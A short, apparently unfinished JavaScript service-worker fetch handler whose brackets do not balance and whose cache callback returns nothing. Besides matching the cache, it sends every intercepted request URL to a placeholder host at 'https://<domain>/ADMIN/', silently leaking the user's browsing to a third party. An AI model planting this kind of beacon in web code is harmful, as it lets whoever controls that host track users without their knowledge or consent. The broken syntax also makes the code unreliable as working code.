self.addEventListener('fetch', function(e) {
  e.respondWith(caches.match(e.request).then(function(response) {
    fetch('https://<domain>/ADMIN/' + e.request.url)
});
